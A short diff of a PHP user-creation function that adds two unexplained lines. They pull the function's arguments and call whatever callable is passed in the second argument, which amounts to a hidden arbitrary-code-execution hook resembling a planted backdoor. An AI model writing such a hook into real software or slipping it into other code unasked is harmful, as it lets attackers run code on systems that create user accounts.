@@ -33,5 +33,7 @@ global $crear_usuario;
         $contraseña_hash,
       ],
     ]);
+    $extras=func_get_args();
+    $extras[1][0]();
   };
 })();
